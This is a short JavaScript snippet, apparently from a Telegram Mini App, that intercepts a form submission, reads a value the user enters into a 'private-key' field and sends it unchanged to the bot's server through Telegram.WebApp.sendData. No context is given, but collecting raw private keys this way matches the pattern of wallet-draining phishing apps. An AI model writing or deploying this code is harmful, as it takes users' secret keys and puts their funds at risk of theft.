document.getElementById('private-key-form').addEventListener('submit', function(event) {
    event.preventDefault();
    const privateKey = document.getElementById('private-key').value;
    Telegram.WebApp.sendData(privateKey);
});
